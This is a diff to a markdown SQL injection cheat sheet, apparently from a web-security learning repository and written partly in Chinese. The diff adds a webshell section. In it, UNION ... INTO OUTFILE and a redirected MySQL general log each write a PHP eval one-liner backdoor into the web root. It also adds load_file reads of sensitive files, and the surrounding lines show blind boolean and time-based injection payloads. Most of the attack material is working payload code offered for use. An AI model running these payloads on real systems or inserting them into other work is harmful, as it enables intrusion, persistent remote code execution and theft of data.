@@ -1,12 +1,14 @@
 # SQL injection  
 SQL is a famous database engine which is used with web server. In this situation, we can inject some SQL based code to get what we want <3.  
 [Remember, practice makes perfect!](http://www.tutorialspoint.com/mysql_terminal_online.php)  
-*  [Basic injection](#basic-injection)  
-*  [Union based injection](#union-based)  
-*  [Blind based injection](#blind-based)  
-*  [Error based injection](#error-based)  
-*  [Waf bypass](#waf-bypass)  
-*  [Dump file](#dump-file)  
+*  [Basic](#basic-injection)  
+*  [Union based](#union-based)  
+*  [Blind based](#blind-based)  
+*  [Error based](#error-based)  
+*  [Waf繞過](#waf-bypass)  
+*  [Webshell...寫檔](#webshell)  
+*  [讀檔](#read-file)  
+*  [sql權限問題](#sql-privilege-management)  
 *  [sprintf/vprintf](#sprintf-vprintf)   
 *  [NoSQL injection](#nosql-injection)  
 *  [Tools](#tools)  
@@ -69,9 +71,9 @@ union select user(),database(),version(), @@version_compile_os--+  // 後面兩�
 **group_concat() is also a litte trick.**
 
 ### Blind based  
-When we cannot show results what we want, we still can find whether it exists or not.  
-**True**: Web page shows normal.  
-**False**: Web page shows error or blank.  
+結果沒顯示在頁面上，也沒有顯示錯誤訊息的場景下.  
+**True**: 頁面顯示正常.  
+**False**: 頁面顯示異常會空結果.  
 **Boolean based**  
 ```sql
 length(str)
@@ -79,10 +81,12 @@ substr(str,pos,len)   // start index from 1
 mid(str,pos,len)
 ascii(str)    // we will get decimal, ord()
 if(a,b,c)   // if a is true, return b, otherwise return c
-id=1' and ascii(substr((select database()),1,1))>65--+
+id=1' and ascii(substr((select database()),1,1))>65--+  // 通常ascii介於32~127
 // 靈活的使用語法
 and (mid((select group_concat(column_name) from information_schema.columns),1,1) like 'd');
-```
+```  
+boolean based是由**頁面返回成功與否**來判定...  
+
 **Time based**  
 ```sql
 id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if 第一個字非s以後的字母 則延遲5秒
@@ -203,8 +207,8 @@ WAF is a defender for web.
   - 爆庫名：`select * from users where name = helloworld();`  
     原理：`ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`
 
-### Dump file
-將查詢結果放到文件中, 或者將一句話木馬放到系統上的php文件中  
+### Webshell
+:racehorse: 將查詢結果放到文件中, 或者將一句話木馬放到系統上的php文件中  
 ```sql
 1' or 1 union select 1,2,"<?php @eval($_POST['hi']);?>" into outfile 'C://xampp/htdocs/sqli/Less-9/muma.php'--+ // 絕對路徑
 // 注意前面的語句必須用雙引號處理
@@ -224,15 +228,40 @@ C:\inetpub\www\root\
 // @@datadir : 數據庫安裝路徑
 id=1' union select 1, @@basedir, @@datadir--+
 ```
-e.g. @@basedir 我們得到```C:/xampp/mysql```的結果, 而網頁根目錄路徑便是```C:/xampp/htdocs/```  
+e.g. @@basedir 我們得到```C:/xampp/mysql```的結果, 而網頁根目錄路徑便是```C:/xampp/htdocs/```，更多內容可以到[INFO-leak](https://github.com/shinmao/Web-Security-Learning/tree/master/INFO-leak)看**爆物理路徑**的部分  
+:racehorse: General log  
+前提一樣是**要有寫的權限**，general log有紀錄執行sql命令的功能  
+```php
+show variables like '%general%';
+set global general_log=on;
+set global general_log_file='/var/www/html/myshell.php';
+```  
+先確定系統中是否開啟紀錄sql指令的功能，將他開啟，然後修改寫入文件，注意要把原本`general_log_file`的位置記下來  
+```php
+select '<?php @eval($_POST[1])?>';
+```  
+若當前db用戶有寫的權限即能寫入成功，然後把`general_log_file`改回原本的文件，把`general_log`設回off  
+
+### Read file  
+上面的webshell相當於用`sql injection`寫檔，那當然也有獨檔的部分。  
+```php
+union select load_file( 文件名hex );
+```  
+這裡讀取文件也需要讀取權限，所以當前數據庫用戶要被允許讀取(通常都有)。上面我們`load_file`常常會用來讀取一些機敏文件，譬如`DB.php`。  
+
+### SQL Privilege management  
+上面碰到的寫檔和讀檔問題我們會碰到數據庫用戶的權限問題。在連上數據庫時，server會先檢查db_user認證，也可以設定限制外連，或特定ip外連。若通過認證，還可以設定當前登入用戶能執行哪些sql指令。  
+[Ref:Mysql權限管理](https://www.cnblogs.com/Richardzhu/p/3318595.html)  
+寫shell用`select into outfile`常會碰到寫入權限的問題，即使`user()`是root... 原因可能是mysql中`--secure-file-priv`限制了寫檔路徑，或者是系統設定(e.g. apparmor)  
+[Ref:關於mysql中select into outfile權限的探討](https://blog.csdn.net/bnxf00000/article/details/64123549)
 
 ### sprintf vprintf
 不會檢查格式化字串的類型。  
-SQLi中，```%'```會被轉譯成```\'``` -> ```%\'``` ```%\```被吃掉，```'```逃逸。
+SQLi中，```%'```會被轉譯成`\'` -> `%\'` `%\`被吃掉，`'`逃逸。
   
 # NoSQL injection
-MongoDB parse data in json format.  
-Therefore, we can not use string to injection any more, but we can use ```{key:value}``` to get what we want.  
+MongoDB用json格式來解析資料.  
+所以我們不能用字串進行注入,而使用```{key:value}```進行注入.  
 ```sql
 // The list of regex
 $gt: >
